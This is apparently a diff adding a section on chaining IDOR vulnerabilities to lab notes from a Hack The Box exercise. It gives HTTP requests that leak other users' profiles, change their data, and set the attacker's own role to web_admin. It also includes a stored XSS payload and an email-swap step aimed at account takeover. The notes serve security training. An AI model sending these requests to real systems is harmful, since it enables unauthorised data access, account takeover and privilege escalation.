@@ -580,3 +580,117 @@ Cookie: role=employee
 
 ---
 
+# 🔗 Chaining IDOR Vulnerabilities
+
+## 📖 Summary
+
+Chaining **IDOR (Insecure Direct Object Reference)** vulnerabilities allows attackers to:
+
+* Leak user data via **GET** requests (information disclosure)
+* Modify other users' data via **PUT** requests (insecure function calls)
+* Escalate privileges (e.g. set own role to `web_admin`)
+* Take over accounts or perform mass modifications
+
+## 🔓 Step-by-Step Exploitation
+
+### 1. **Information Disclosure via IDOR**
+
+* Send a `GET` request to retrieve another user's details:
+
+  ```http
+  GET /profile/api.php/profile/2
+  Cookie: role=employee
+  ```
+* Response:
+
+  ```json
+  {
+      "uid": "2",
+      "uuid": "4a9bd19b3b8676199592a346051f950c",
+      "role": "employee",
+      "full_name": "Iona Franklyn",
+      "email": "i_franklyn@employees.htb",
+      "about": "..."
+  }
+  ```
+
+### 2. **Modify Another User’s Data**
+
+* Use the leaked `uuid` to send a `PUT` request:
+
+  ```http
+  PUT /profile/api.php/profile/2
+  {
+      "uid": 2,
+      "uuid": "4a9bd19b3b8676199592a346051f950c",
+      "role": "employee",
+      "full_name": "Modified",
+      "email": "attacker@example.com",
+      "about": "<script>alert(1)</script>"
+  }
+  ```
+
+### 3. **Enumerate Users to Find Admin**
+
+* Script or manual enumeration of `/profile/api.php/profile/<uid>`
+* Identify admin user:
+
+  ```json
+  {
+      "uid": "X",
+      "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
+      "role": "web_admin",
+      "full_name": "administrator",
+      "email": "webadmin@employees.htb",
+      "about": "HTB{FLAG}"
+  }
+  ```
+
+### 4. **Privilege Escalation**
+
+* Modify your own role to `web_admin`:
+
+  ```json
+  {
+      "uid": 1,
+      "uuid": "your-valid-uuid",
+      "role": "web_admin",
+      ...
+  }
+  ```
+* No error = success ✅
+
+### 5. **Create New Users (as Admin)**
+
+* Send a `POST` request:
+
+  ```http
+  POST /profile/api.php
+  {
+      "uid": 99,
+      "uuid": "new-uuid",
+      "role": "employee",
+      "full_name": "New User",
+      "email": "new@user.com",
+      "about": "Created by admin"
+  }
+  ```
+
+## 🧪 Attack Possibilities
+
+* 🛠 **Account Takeover**: Modify user’s email → trigger password reset
+* 💉 **Stored XSS**: Inject script in `about` field
+* 👑 **Admin Access**: Elevate role to `web_admin`
+* 🧹 **Mass User Edits**: Change emails or inject payloads across all users
+
+## 🔐 Key Takeaways
+
+* APIs relying on client-side authorization (e.g. role cookies) are insecure.
+* UUIDs often serve as access tokens — leaking them allows privilege abuse.
+* Combining **information leakage** and **insecure function calls** leads to full compromise.
+* Always test for both read (`GET`) and write (`PUT`, `POST`, `DELETE`) IDOR vectors.
+
+---
+
+---
+
